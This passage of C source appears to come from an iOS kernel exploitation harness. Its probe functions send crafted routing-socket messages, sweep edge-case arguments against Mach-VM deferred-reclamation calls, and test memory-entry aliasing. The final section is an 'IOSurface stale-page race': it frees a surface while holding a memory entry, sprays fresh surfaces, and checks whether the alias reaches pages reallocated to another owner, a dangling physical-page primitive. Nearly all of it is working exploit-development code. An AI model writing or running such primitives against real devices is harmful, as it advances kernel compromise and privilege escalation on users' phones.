                    q->sin_addr.s_addr = htonl(0xc6336400u);
                    rtm->rtm_msglen = (uint16_t)(off + q->sin_len);
                    rtm->rtm_version = AGX_RTM_VERSION;
                    rtm->rtm_type = AGX_RTM_GET;
                    rtm->rtm_addrs = AGX_RTA_DST;
                    rtm->rtm_seq = 6;

                    errno = 0;
                    s = send(fd, msg, rtm->rtm_msglen, 0);
                    rtp_log("[*] routesock S6 GET 198.51.100.0 -> %zd errno=%d", s, errno);
                    got = rtp_read(fd, rb, sizeof(rb), 1200);
                    rtp_log("[*] routesock S6 reply -> %d bytes", got);
                    if (got > 0) { rtp_dump("S6", rb, got); rtp_hdr("S6", rb, got); rtp_sas("S6", rb, got); }
                    else stages[6]++;

                    /* --- S7: RTM_DELETE it again --- */
                    memset(msg, 0, sizeof(msg));
                    rtm = (struct agx_rt_msghdr *)msg;
                    off = sizeof(*rtm);
                    struct sockaddr_in *dd = (struct sockaddr_in *)(msg + off);
                    dd->sin_len = sizeof(*dd); dd->sin_family = AF_INET;
                    dd->sin_addr.s_addr = htonl(0xc6336400u);
                    off += (dd->sin_len + 3) & ~(size_t)3;
                    struct sockaddr_in *dm = (struct sockaddr_in *)(msg + off);
                    dm->sin_len = sizeof(*dm); dm->sin_family = AF_INET;
                    dm->sin_addr.s_addr = htonl(0xffffff00u);
                    off += (dm->sin_len + 3) & ~(size_t)3;
                    rtm->rtm_msglen = (uint16_t)off;
                    rtm->rtm_version = AGX_RTM_VERSION;
                    rtm->rtm_type = AGX_RTM_DELETE;
                    rtm->rtm_flags = AGX_RTF_UP | AGX_RTF_GATEWAY;
                    rtm->rtm_addrs = AGX_RTA_DST | AGX_RTA_NETMASK;
                    rtm->rtm_seq = 7;

                    errno = 0;
                    s = send(fd, msg, rtm->rtm_msglen, 0);
                    rtp_log("[*] routesock S7 RTM_DELETE 198.51.100.0/24 msglen=%u -> %zd errno=%d",
                            (unsigned)rtm->rtm_msglen, s, errno);
                    got = rtp_read(fd, rb, sizeof(rb), 1200);
                    rtp_log("[*] routesock S7 reply -> %d bytes", got);
                    if (got > 0) { rtp_dump("S7", rb, got); rtp_hdr("S7", rb, got); }
                    else stages[7]++;

                    /* --- S8: confirm the route is gone --- */
                    memset(msg, 0, sizeof(msg));
                    rtm = (struct agx_rt_msghdr *)msg;
                    off = sizeof(*rtm);
                    struct sockaddr_in *qq = (struct sockaddr_in *)(msg + off);
                    qq->sin_len = sizeof(*qq); qq->sin_family = AF_INET;
                    qq->sin_addr.s_addr = htonl(0xc6336400u);
                    rtm->rtm_msglen = (uint16_t)(off + qq->sin_len);
                    rtm->rtm_version = AGX_RTM_VERSION;
                    rtm->rtm_type = AGX_RTM_GET;
                    rtm->rtm_addrs = AGX_RTA_DST;
                    rtm->rtm_seq = 8;

                    errno = 0;
                    s = send(fd, msg, rtm->rtm_msglen, 0);
                    rtp_log("[*] routesock S8 GET 198.51.100.0 after delete -> %zd errno=%d", s, errno);
                    got = rtp_read(fd, rb, sizeof(rb), 1200);
                    rtp_log("[*] routesock S8 reply -> %d bytes", got);
                    if (got > 0) { rtp_dump("S8", rb, got); rtp_hdr("S8", rb, got); rtp_sas("S8", rb, got); }
                    else stages[8]++;
                }
                close(fd);
                rtp_log("[*] routesock done: stages(failures) = %d %d %d %d %d %d %d %d %d, first_err=%d",
                        stages[0], stages[1], stages[2], stages[3], stages[4], stages[5],
                        stages[6], stages[7], stages[8], first_err);
                return first_err;
            }

    // ---- VM deferred-reclamation MIG surface probe (2026-11-14) -----------------
    // iOS 27.0.1 exposes a Mach-VM "deferred reclamation" subsystem: a task-owned
    // userspace buffer of {address,size,deadline} entries that the vm_reclaim
    // kernel thread turns into vm_map_remove_guard() calls on the owning task.
    // The kernel copies head/tail/busy and the entry array straight out of our
    // address space (copyin_atomic64), so the buffer is a directly
    // app-controlled kernel input path above the kalloc_type wall.
    //
    // Routines and signatures are taken verbatim from the mach_vm.defs shipped in
    // the macOS 27 SDK (same XNU generation):
    //   mach_vm_deferred_reclamation_buffer_allocate(task_t, out mach_vm_address_t,
    //                                                out uint64_t, uint32_t len,
    //                                                uint32_t max_len)
    //   mach_vm_deferred_reclamation_buffer_flush(task_t, uint32_t n,
    //                                             out uint64_t, out uint64_t)
    //   mach_vm_deferred_reclamation_buffer_resize(task_t, uint32_t new_len,
    //                                              out uint64_t, out uint64_t)
    //   mach_vm_deferred_reclamation_buffer_query(task_read_t, out mach_vm_address_t,
    //                                             out mach_vm_size_t)
    // They are looked up with dlsym rather than linked, so a device whose libSystem
    // dropped them (27.2 renamed this family to mach_vm_reclaim_ring_*) is reported
    // instead of failing to launch.
    #include <dlfcn.h>
    #include <mach/mach.h>

    typedef kern_return_t (*agx_vrp_alloc_t)(task_t, mach_vm_address_t *,
                                             uint64_t *, uint32_t, uint32_t);
    typedef kern_return_t (*agx_vrp_flush_t)(task_t, uint32_t, uint64_t *, uint64_t *);
    typedef kern_return_t (*agx_vrp_resize_t)(task_t, uint32_t, uint64_t *, uint64_t *);
    typedef kern_return_t (*agx_vrp_query_t)(task_read_t, mach_vm_address_t *,
                                             mach_vm_size_t *);
    /* mach_vm_allocate's prototype lives in <mach/mach_vm.h>, which the iOS SDK
       deliberately #errors out, so declare it here rather than hand-rolling
       prototypes for the vm_* equivalents (this is a client-side MIG call, not
       the kernel entry point). */
    extern kern_return_t mach_vm_allocate(vm_map_t, mach_vm_address_t *,
                                          mach_vm_size_t, int);

    static void vrp_log(const char *fmt, ...)
    {
        char buf[384];
        va_list ap;
        va_start(ap, fmt);
        vsnprintf(buf, sizeof(buf), fmt, ap);
        va_end(ap);
        log_from_c(buf);
        fputs(buf, stdout);
        fputc('\n', stdout);
        fflush(stdout);
    }

    static const char *vrp_kr(kern_return_t kr)
    {
        switch (kr) {
            case KERN_SUCCESS:              return "OK";
            case KERN_INVALID_ARGUMENT:     return "InvalidArgument";
            case KERN_FAILURE:              return "Failure";
            case KERN_NOT_SUPPORTED:        return "NotSupported";
            case KERN_NO_SPACE:             return "NoSpace";
            default:                        return NULL;
        }
    }

    static void vrp_krlog(const char *what, kern_return_t kr)
    {
        const char *n = vrp_kr(kr);
        if (n) vrp_log("[*] reclaim %s -> %s (%d)", what, n, (int)kr);
        else   vrp_log("[*] reclaim %s -> kr=%d (0x%x)", what, (int)kr, (unsigned)kr);
    }

    /* Non-faulting way to ask whether a range is still mapped in our own task. */
    static int vrp_mapped(const void *p, size_t len)
    {
        vm_address_t a = (vm_address_t)p;
        vm_size_t sz = 0;
        vm_region_basic_info_data_64_t info;
        mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
        mach_port_t obj = 0;
        kern_return_t kr = vm_region_64(mach_task_self(), &a, &sz,
                                        VM_REGION_BASIC_INFO_64,
                                        (vm_region_info_t)&info, &cnt, &obj);
        if (kr != KERN_SUCCESS) return -1;            /* not mapped */
        return (a <= (vm_address_t)p && (vm_address_t)p < a + sz) ? 1 : 0;
    }

    int vm_reclaim_probe(int *stages)
    {
        for (int i = 0; i < 12; i++) stages[i] = 0;

        const char *names[4] = {
            "_mach_vm_deferred_reclamation_buffer_allocate",
            "_mach_vm_deferred_reclamation_buffer_flush",
            "_mach_vm_deferred_reclamation_buffer_resize",
            "_mach_vm_deferred_reclamation_buffer_query",
        };
        void *syms[4] = { 0, 0, 0, 0 };
        int found = 0;
        for (int i = 0; i < 4; i++) {
            syms[i] = dlsym(RTLD_DEFAULT, names[i]);
            vrp_log("[*] reclaim dlsym %s -> %p", names[i], syms[i]);
            if (syms[i]) found++;
        }
        stages[0] = found;

        /* --- C1: dlsym controls -------------------------------------------
           Proves the dlsym mechanism sees real mach_vm symbols, so the NULL
           above for the deferred-reclamation family is a genuine absence and
           not a lookup artifact. Also tests whether the mach_vm extension
           routines (reallocate, range_create, reclaim_ring_*) are exported. */
        {
            const char *ctl[] = {
                "_mach_vm_allocate", "_mach_vm_deallocate",
                "_mach_vm_purgable_control", "_mach_vm_range_create",
                "_mach_vm_reallocate", "_mach_vm_reclaim_ring_allocate",
            };
            int ctl_found = 0;
            for (int i = 0; i < 6; i++) {
                void *s = dlsym(RTLD_DEFAULT, ctl[i]);
                vrp_log("[*] reclaim ctl dlsym %s -> %p", ctl[i], s);
                if (s) ctl_found++;
            }
            stages[8] = ctl_found;

            void *ra = dlsym(RTLD_DEFAULT, "_mach_vm_reallocate");
            if (ra) {
                typedef kern_return_t (*agx_realloc_t)(vm_map_t, mach_vm_address_t,
                                                       mach_vm_size_t,
                                                       mach_vm_address_t *,
                                                       mach_vm_size_t,
                                                       mach_vm_offset_t, int, int);
                mach_vm_address_t addr = 0;
                mach_vm_size_t sz = 0x10000;
                kern_return_t ka = mach_vm_allocate(mach_task_self(), &addr, sz,
                                                    VM_FLAGS_ANYWHERE);
                vrp_krlog("reallocate:pre-alloc", ka);
                if (ka == KERN_SUCCESS && addr != 0) {
                    memset((void *)(uintptr_t)addr, 0x5a, sz);
                    mach_vm_address_t dst = addr;
                    kern_return_t kr = ((agx_realloc_t)ra)(mach_task_self(), addr, sz, &dst,
                                                           sz, 0, 0, 0);
                    vrp_krlog("reallocate(in-place,same-size)", kr);
                    vrp_log("[*] reclaim reallocate dst=0x%llx (src=0x%llx) "
                            "still_mapped=%d",
                            (unsigned long long)dst, (unsigned long long)addr,
                            vrp_mapped((void *)(uintptr_t)addr, sz));
                    stages[9]++;
                    vm_deallocate(mach_task_self(), addr, sz);
                    if (dst != addr && dst != 0) vm_deallocate(mach_task_self(), dst, sz);
                }
            } else {
                vrp_log("[*] reclaim: _mach_vm_reallocate not exported either; "
                        "the whole mach_vm extension family is absent from iOS "
                        "libSystem");
            }
        }
        if (!found) {
            vrp_log("[*] reclaim: no deferred-reclamation symbols in libSystem "
                    "(family may have been renamed to mach_vm_reclaim_ring_*)");
            return -1;
        }

        task_t self = mach_task_self();

        /* --- Q0: query before any buffer exists --------------------------- */
        if (syms[3]) {
            mach_vm_address_t qa = 0;
            mach_vm_size_t qs = 0;
            kern_return_t kr = ((agx_vrp_query_t)syms[3])(self, &qa, &qs);
            vrp_krlog("query(pre)", kr);
            if (kr == KERN_SUCCESS) {
                vrp_log("[*] reclaim query(pre) addr=0x%llx size=0x%llx",
                        (unsigned long long)qa, (unsigned long long)qs);
                stages[1]++;
            } else {
                stages[2]++;
            }
        }

        /* --- A1..A4: argument-shape sweep (no state change expected) ------ */
        static const struct { uint32_t len; uint32_t max_len; const char *tag; } atab[] = {
            { 0x1000,      0x100000,    "len=0x1000 max=0x100000" },
            { 0x10000,     0x100000,    "len=0x10000 max=0x100000" },
            { 0,           0,           "len=0 max=0" },
            { 0x1000,      0,           "len=0x1000 max=0" },
            { 0xffffffffu, 0xffffffffu, "len=UINT32_MAX max=UINT32_MAX" },
        };
        mach_vm_address_t alloc_addr = 0;
        uint64_t alloc_deadline = 0;
        int alloc_ok = -1;
        for (int i = 0; i < 5; i++) {
            mach_vm_address_t a = 0;
            uint64_t dl = 0;
            kern_return_t kr = KERN_FAILURE;
            if (syms[0]) kr = ((agx_vrp_alloc_t)syms[0])(self, &a, &dl,
                                                          atab[i].len, atab[i].max_len);
            vrp_log("[*] reclaim allocate(%s) -> kr=%d addr=0x%llx deadline=0x%llx",
                    atab[i].tag, (int)kr, (unsigned long long)a,
                    (unsigned long long)dl);
            if (kr == KERN_SUCCESS) {
                alloc_ok = i;
                alloc_addr = a;
                alloc_deadline = dl;
                break;
            }
        }
        stages[3] = (alloc_ok >= 0) ? 1 : 0;
        if (alloc_ok < 0) {
            vrp_log("[*] reclaim: no allocate variant succeeded; stopping "
                    "(reclaim is disabled on this build if kr=NotSupported)");
            return -2;
        }

        /* --- Q1: query must now report the buffer we were given ----------- */
        if (syms[3]) {
            mach_vm_address_t qa = 0;
            mach_vm_size_t qs = 0;
            kern_return_t kr = ((agx_vrp_query_t)syms[3])(self, &qa, &qs);
            vrp_krlog("query(post)", kr);
            if (kr == KERN_SUCCESS) {
                vrp_log("[*] reclaim query(post) addr=0x%llx size=0x%llx "
                        "(allocated addr was 0x%llx)",
                        (unsigned long long)qa, (unsigned long long)qs,
                        (unsigned long long)alloc_addr);
                stages[4]++;
                /* The header of the buffer carries the head/tail/busy indices
                   the kernel copyin_atomic64s. Report them. */
                if (qs >= 40) {
                    uint64_t h = *(volatile uint64_t *)(uintptr_t)qa;
                    uint64_t t = *(volatile uint64_t *)(uintptr_t)(qa + 8);
                    uint64_t b = *(volatile uint64_t *)(uintptr_t)(qa + 16);
                    vrp_log("[*] reclaim buffer indices @0x%llx: head=%llu tail=%llu busy=%llu",
                            (unsigned long long)qa,
                            (unsigned long long)h, (unsigned long long)t,
                            (unsigned long long)b);
                }
            }
        }

        /* --- O1: touch the buffer header; it is ours ---------------------- */
        vrp_log("[*] reclaim buffer region mapped=%d (expect 1)",
                vrp_mapped((void *)(uintptr_t)alloc_addr, 0x1000));

        /* --- F1: flush with zero entries (idempotent?) ------------------- */
        if (syms[1]) {
            uint64_t bytes = 0, dl = 0;
            kern_return_t kr = ((agx_vrp_flush_t)syms[1])(self, 0, &bytes, &dl);
            vrp_krlog("flush(0)", kr);
            vrp_log("[*] reclaim flush(0) bytes_reclaimed=%llu next_deadline=0x%llx",
                    (unsigned long long)bytes, (unsigned long long)dl);
            stages[5]++;
        }

        /* --- R1: shrink/flush variants ----------------------------------- */
        if (syms[2]) {
            uint64_t bytes = 0, dl = 0;
            kern_return_t kr = ((agx_vrp_resize_t)syms[2])(self, 0x1000, &bytes, &dl);
            vrp_krlog("resize(0x1000)", kr);
            vrp_log("[*] reclaim resize(0x1000) bytes_reclaimed=%llu next_deadline=0x%llx",
                    (unsigned long long)bytes, (unsigned long long)dl);
            stages[6]++;
        }

        /* --- D1: does a flush actually reclaim anything we can observe?
           Map a scratch region, dirty it, then ask for a large flush. We never
           dereference it afterwards: vm_region_64 reports its fate. */
        {
            size_t sz = 4 * 1024 * 1024;
            void *p = mmap(NULL, sz, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANON, -1, 0);
            if (p != MAP_FAILED) {
                memset(p, 0x41, sz);
                vrp_log("[*] reclaim scratch map @%p mapped=%d", p,
                        vrp_mapped(p, sz));
                if (syms[1]) {
                    uint64_t bytes = 0, dl = 0;
                    kern_return_t kr = ((agx_vrp_flush_t)syms[1])(self, 0xffffffffu,
                                                                  &bytes, &dl);
                    vrp_krlog("flush(UINT32_MAX)", kr);
                    vrp_log("[*] reclaim flush(MAX) bytes_reclaimed=%llu "
                            "next_deadline=0x%llx", (unsigned long long)bytes,
                            (unsigned long long)dl);
                    stages[7]++;
                }
                vrp_log("[*] reclaim scratch map @%p still_mapped=%d (post-flush)",
                        p, vrp_mapped(p, sz));
                munmap(p, sz);
            } else {
                vrp_log("[*] reclaim scratch mmap failed errno=%d", errno);
            }
        }

        vrp_log("[*] reclaim done: dlsym=%d query_pre_ok=%d query_pre_fail=%d "
                "alloc_ok=%d query_post_ok=%d flush0=%d resize=%d flushMAX=%d",
                stages[0], stages[1], stages[2], stages[3], stages[4],
                stages[5], stages[6], stages[7]);
        return 0;
    }

/* ------------------------------------------------------------------ */
/* External-object / physical-primitive gate.                          */
/*                                                                     */
/* A standing note in this project says mach_make_memory_entry_64      */
/* returns KERN_FAILURE for an unsigned app on every call, which would */
/* close the IOSurface-backed external-object route before any         */
/* harness exists. Parallel work on this device reports success over   */
/* an IOSurface mapping. This measures it directly, in stages:        */
/*   1 vm_allocate a writable page-aligned region                      */
/*   2 mach_make_memory_entry_64 over that region                      */
/*   3 vm_map the returned object at a fresh address                  */
/*   4 write through the base mapping, read through the alias          */
/* Nothing leaves the app's own address space; no device writes.       */

#include <stdarg.h>

static void mep_log(const char *fmt, ...)
{
    char buf[384];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    log_from_c(buf);
    fputs(buf, stdout);
    fputc('\n', stdout);
    fflush(stdout);
}

int mem_entry_probe(int *stages)
{
    if (!stages) return -1;
    for (int i = 0; i < 8; i++) stages[i] = 0;

    const vm_size_t sz = 0x10000;

    /* stage 1 - our own anonymous allocation */
    vm_address_t addr = 0;
    kern_return_t kr = vm_allocate(mach_task_self(), &addr, sz, VM_FLAGS_ANYWHERE);
    mep_log("[*] mementry vm_allocate -> %d (0x%x) at 0x%llx",
            (int)kr, (unsigned)kr, (unsigned long long)addr);
    stages[1] = (int)kr;
    if (kr != KERN_SUCCESS || !addr) return 0;

    *(volatile uint32_t *)(uintptr_t)addr = 0xc0ffee27u;

    /* stage 2 - memory entry over that exact region */
    memory_object_size_t entry_size = (memory_object_size_t)sz;
    mach_port_t obj = MACH_PORT_NULL;
    kr = mach_make_memory_entry_64(mach_task_self(), &entry_size,
                                   (memory_object_offset_t)addr,
                                   VM_PROT_DEFAULT,
                                   &obj, MACH_PORT_NULL);
    mep_log("[*] mementry make_memory_entry_64 -> %d (0x%x) handle=0x%x size=%llu",
            (int)kr, (unsigned)kr, (unsigned)obj, (unsigned long long)entry_size);
    stages[2] = (int)kr;
    if (kr != KERN_SUCCESS || obj == MACH_PORT_NULL) {
        vm_deallocate(mach_task_self(), addr, sz);
        return 0;
    }

    /* stage 3 - second mapping of the same memory object */
    vm_address_t alias = 0;
    kr = vm_map(mach_task_self(), &alias, sz, 0, VM_FLAGS_ANYWHERE,
                obj, 0, FALSE, VM_PROT_DEFAULT, VM_PROT_ALL, VM_INHERIT_NONE);
    mep_log("[*] mementry vm_map(alias) -> %d (0x%x) at 0x%llx",
            (int)kr, (unsigned)kr, (unsigned long long)alias);
    stages[3] = (int)kr;
    if (kr != KERN_SUCCESS || !alias) {
        mach_port_deallocate(mach_task_self(), obj);
        vm_deallocate(mach_task_self(), addr, sz);
        return 0;
    }

    /* stage 4 - do both addresses name the same physical page? */
    uint32_t base_marker = *(volatile uint32_t *)(uintptr_t)addr;
    uint32_t alias_marker = *(volatile uint32_t *)(uintptr_t)alias;
    int match = (base_marker == 0xc0ffee27u && alias_marker == 0xc0ffee27u);
    mep_log("[*] mementry marker base=0x%08x alias=0x%08x alias_is_same_page=%s",
            base_marker, alias_marker, match ? "YES" : "no");
    stages[4] = match ? 1 : 0;

    vm_deallocate(mach_task_self(), alias, sz);
    mach_port_deallocate(mach_task_self(), obj);
    vm_deallocate(mach_task_self(), addr, sz);
    return 0;
}



/* ------------------------------------------------------------------ */
/* IOSurface stale-page race (ClearSword-style physical gate).         */
/*                                                                     */
/* `--iosurfphys` proved an unsigned app can wrap an IOSurface's       */
/* backing pages in a memory entry and alias them at a chosen VA. It   */
/* did not prove the pages can be *freed* while anything still names    */
/* them: a user mapping pins the object, so the interesting variant    */
/* must drop every user mapping before the surface dies and keep only  */
/* the memory object.                                                  */
/*                                                                     */
/* Phase 0 is a control: without any memory entry, does the IOSurface  */
/* allocator hand the released base address back out during a spray?   */
/* If it does not, the race below cannot be observed at all.           */
/*                                                                     */
/* Phases:                                                             */
/*   0 control  - create/release/spray, look for base reuse            */
/*   1 create a PurpleGfxMem surface, write a marker through its base  */
/*   2 make a memory entry over that base                              */
/*   3 map the entry once to confirm aliasing, then DEALLOCATE it      */
/*   4 CFRelease the surface, spray fresh surfaces, re-map the entry   */
/*      and read: marker intact => the entry retains the object;       */
/*      content matching a sprayed surface => it names freed pages     */
/*      that have been reallocated.                                    */
/*                                                                     */
/* All log lines go to both log_from_c and stdout so the devicectl     */
/* console capture sees every stage.                                   */

#include <CoreFoundation/CoreFoundation.h>
#include <dlfcn.h>

typedef struct __IOSurface *iosr_ref_t;
typedef iosr_ref_t (*iosr_create_fn)(CFDictionaryRef);
typedef uint32_t (*iosr_getid_fn)(iosr_ref_t);
typedef void *(*iosr_getbase_fn)(iosr_ref_t);
typedef size_t (*iosr_getalloc_fn)(iosr_ref_t);

typedef kern_return_t (*iosr_mach_vm_map_fn)(vm_map_t, mach_vm_address_t *,
                                             mach_vm_size_t, mach_vm_offset_t,
                                             int, mach_port_t,
                                             memory_object_offset_t,
                                             boolean_t, vm_prot_t, vm_prot_t,
                                             vm_inherit_t);

#define IOSR_ALLOC 0x8000
#define IOSR_SPRAY 64

static iosr_create_fn  g_iosr_create;
static iosr_getid_fn   g_iosr_getid;
static iosr_getbase_fn g_iosr_getbase;
static iosr_getalloc_fn g_iosr_getalloc;
static iosr_mach_vm_map_fn g_iosr_vm_map;
static iosr_ref_t g_iosr_keep[IOSR_SPRAY];

static iosr_ref_t iosr_make_sized(int use_region, long alloc)
{
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    if (!props) return NULL;

    int w = 64, h = 2, bpe = 4, row = 256, pix = 1111970369 /* 'BGRA' */;
    CFNumberRef n;
    n = CFNumberCreate(NULL, kCFNumberIntType, &w);    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), n);         CFRelease(n);
    n = CFNumberCreate(NULL, kCFNumberIntType, &h);    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), n);        CFRelease(n);
    n = CFNumberCreate(NULL, kCFNumberIntType, &bpe);  CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), n); CFRelease(n);
    n = CFNumberCreate(NULL, kCFNumberIntType, &row);  CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), n);   CFRelease(n);
    n = CFNumberCreate(NULL, kCFNumberIntType, &pix);  CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), n);   CFRelease(n);
    n = CFNumberCreate(NULL, kCFNumberLongType, &alloc);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), n); CFRelease(n);
    if (use_region)
        CFDictionarySetValue(props, CFSTR("IOSurfaceMemoryRegion"), CFSTR("PurpleGfxMem"));

    iosr_ref_t s = g_iosr_create(props);
    CFRelease(props);
    return s;
}

static iosr_ref_t iosr_make(int use_region)
{
    return iosr_make_sized(use_region, IOSR_ALLOC);
}

static int iosr_spray(int use_region, int count)
{
    int kept = 0;
    for (int i = 0; i < count; i++) {
        iosr_ref_t s = iosr_make(use_region);
        if (!s) break;
        g_iosr_keep[kept++] = s;
    }
    return kept;
}

static void iosr_release_all(void)
{
    for (int i = 0; i < IOSR_SPRAY; i++) {
        if (g_iosr_keep[i]) CFRelease(g_iosr_keep[i]);
        g_iosr_keep[i] = NULL;
    }
}

static int iosr_find_base(uint64_t want)
{
    for (int i = 0; i < IOSR_SPRAY; i++) {
        if (!g_iosr_keep[i]) continue;
        if ((uint64_t)(uintptr_t)g_iosr_getbase(g_iosr_keep[i]) == want) return i;
    }
    return -1;
}

int iosurf_race_probe(int *stages)
{
    if (!stages) return -1;
    for (int i = 0; i < 8; i++) stages[i] = 0;

    void *fh = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
    if (!fh) fh = dlopen("IOSurface", RTLD_NOW);
    if (!fh) { mep_log("[-] iosurfrace: dlopen IOSurface failed: %s", dlerror()); return 0; }

    g_iosr_create  = (iosr_create_fn)dlsym(fh, "IOSurfaceCreate");
    g_iosr_getid   = (iosr_getid_fn)dlsym(fh, "IOSurfaceGetID");
    g_iosr_getbase = (iosr_getbase_fn)dlsym(fh, "IOSurfaceGetBaseAddress");
    g_iosr_getalloc = (iosr_getalloc_fn)dlsym(fh, "IOSurfaceGetAllocSize");
    void *lh = dlopen("/usr/lib/libSystem.B.dylib", RTLD_NOW);
    g_iosr_vm_map = (iosr_mach_vm_map_fn)dlsym(lh ? lh : RTLD_DEFAULT, "mach_vm_map");

    mep_log("[*] iosurfrace syms create=%p id=%p base=%p alloc=%p mach_vm_map=%p",
            (void *)g_iosr_create, (void *)g_iosr_getid, (void *)g_iosr_getbase,
            (void *)g_iosr_getalloc, (void *)g_iosr_vm_map);
    if (!g_iosr_create || !g_iosr_getid || !g_iosr_getbase || !g_iosr_getalloc || !g_iosr_vm_map) {
        mep_log("[-] iosurfrace: a required symbol is missing");
        return 0;
    }

    /* ---- phase 0: control - does the allocator recycle a released base? ---- */
    iosr_ref_t ctl = iosr_make(1);
    if (!ctl) { mep_log("[-] iosurfrace: control surface create failed"); return 0; }
    uint64_t ctl_base = (uint64_t)(uintptr_t)g_iosr_getbase(ctl);
    mep_log("[*] iosurfrace phase0 control base=0x%llx alloc=0x%zx",
            (unsigned long long)ctl_base, g_iosr_getalloc(ctl));
    CFRelease(ctl);
    int kept0 = iosr_spray(1, IOSR_SPRAY);
    int reused0 = iosr_find_base(ctl_base);
    mep_log("[*] iosurfrace phase0 after release + spray(%d): base_reused=%s idx=%d",
            kept0, reused0 >= 0 ? "YES" : "no", reused0);
    stages[0] = (reused0 >= 0) ? 1 : 0;
    iosr_release_all();

    /* ---- phase 1: surface + marker ---- */
    iosr_ref_t s = iosr_make(1);
    if (!s) { mep_log("[-] iosurfrace: surface create failed"); return 0; }
    uint64_t base = (uint64_t)(uintptr_t)g_iosr_getbase(s);
    size_t alloc = g_iosr_getalloc(s);
    uint32_t marker = 0xAAAA0001u;
    *(volatile uint32_t *)(uintptr_t)base = marker;
    uint32_t rb = *(volatile uint32_t *)(uintptr_t)base;
    mep_log("[*] iosurfrace surface id=0x%x base=0x%llx alloc=0x%zx marker=0x%08x rb=0x%08x",
            g_iosr_getid(s), (unsigned long long)base, alloc, marker, rb);
    stages[1] = (rb == marker) ? 1 : 0;

    /* ---- phase 2: memory entry over the surface base ---- */
    mach_vm_size_t esz = (mach_vm_size_t)alloc;
    mach_port_t obj = MACH_PORT_NULL;
    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &esz,
                                                 (mach_vm_offset_t)base,
                                                 VM_PROT_READ | VM_PROT_WRITE,
                                                 &obj, MACH_PORT_NULL);
    mep_log("[*] iosurfrace entry(size=0x%llx) -> kr=%d (0x%x) handle=0x%x",
            (unsigned long long)esz, (int)kr, (unsigned)kr, (unsigned)obj);
    stages[2] = (int)kr;
    if (kr != KERN_SUCCESS || obj == MACH_PORT_NULL) {
        CFRelease(s);
        return 0;
    }

    /* ---- phase 3: confirm aliasing, then drop the user mapping ---- */
    mach_vm_address_t a1 = 0;
    kr = g_iosr_vm_map(mach_task_self(), &a1, esz, 0, VM_FLAGS_ANYWHERE, obj, 0, FALSE,
                       VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
                       VM_INHERIT_NONE);
    uint32_t m1 = 0;
    if (kr == KERN_SUCCESS && a1) m1 = *(volatile uint32_t *)(uintptr_t)a1;
    mep_log("[*] iosurfrace alias1 -> kr=%d (0x%x) at 0x%llx marker=0x%08x same=%s",
            (int)kr, (unsigned)kr, (unsigned long long)a1, m1,
            (m1 == marker) ? "YES" : "no");
    stages[3] = (m1 == marker) ? 1 : 0;
    if (a1) vm_deallocate(mach_task_self(), (vm_address_t)a1, (vm_size_t)esz);
    mep_log("[*] iosurfrace alias1 deallocated; no user mapping of the object remains");

    /* ---- phase 4: destroy the surface, spray, re-map the entry ---- */
    CFRelease(s);
    mep_log("[*] iosurfrace surface CFReleased; only the memory entry remains");

    int kept = iosr_spray(1, IOSR_SPRAY);
    int idx = iosr_find_base(base);
    mep_log("[*] iosurfrace spray(%d): old base reclaimed=%s idx=%d",
            kept, idx >= 0 ? "YES" : "no", idx);
    stages[4] = (idx >= 0) ? 1 : 0;

    mach_vm_address_t a2 = 0;
    kr = g_iosr_vm_map(mach_task_self(), &a2, esz, 0, VM_FLAGS_ANYWHERE, obj, 0, FALSE,
                       VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
                       VM_INHERIT_NONE);
    uint32_t m2 = 0xffffffffu;
    if (kr == KERN_SUCCESS && a2) m2 = *(volatile uint32_t *)(uintptr_t)a2;
    uint32_t spray_word = 0xdeadbeefu;
    if (idx >= 0)
        spray_word = *(volatile uint32_t *)(uintptr_t)g_iosr_getbase(g_iosr_keep[idx]);

    mep_log("[*] iosurfrace alias2(after release) -> kr=%d (0x%x) at 0x%llx read=0x%08x",
            (int)kr, (unsigned)kr, (unsigned long long)a2, m2);
    mep_log("[*] iosurfrace spray_base_content=0x%08x", spray_word);

    /* Discriminator: the first read cannot tell "the entry pinned its own copy"
       from "the entry names pages that have been reallocated". Write a fresh
       value through the reclaimed surface's own mapping and read the entry
       again - if the alias follows, it is naming the *current* owner's pages. */
    uint32_t follow = 0;
    int other = (idx >= 0 && idx != 0) ? 0 : 1;
    if (idx >= 0 && a2) {
        *(volatile uint32_t *)(uintptr_t)g_iosr_getbase(g_iosr_keep[idx]) = 0x77770002u;
        follow = *(volatile uint32_t *)(uintptr_t)a2;
        if (other < IOSR_SPRAY && g_iosr_keep[other])
            *(volatile uint32_t *)(uintptr_t)g_iosr_getbase(g_iosr_keep[other]) = 0x66660003u;
        uint32_t follow2 = *(volatile uint32_t *)(uintptr_t)a2;
        mep_log("[*] iosurfrace discriminator: wrote 0x77770002 into reclaimed surface, "
                "alias now reads 0x%08x (after control write: 0x%08x)",
                follow, follow2);
        mep_log("[*] iosurfrace VERDICT alias_follows_new_owner=%s marker_intact=%s",
                (follow == 0x77770002u) ? "YES" : "no",
                (follow == marker) ? "YES" : "no");
        stages[5] = (follow == 0x77770002u) ? 2 : ((follow == marker) ? 1 : 0);
    } else {
        mep_log("[*] iosurfrace VERDICT marker_intact=%s", (m2 == marker) ? "YES" : "no");
        stages[5] = (m2 == marker) ? 1 : 0;
    }

    if (a2) vm_deallocate(mach_task_self(), (vm_address_t)a2, (vm_size_t)esz);
    mach_port_deallocate(mach_task_self(), obj);
    iosr_release_all();
    return 0;
}

/* ------------------------------------------------------------------ */
/* IOSurface freed-page reclaim-type expansion (cross-type probe).     */
/*                                                                     */
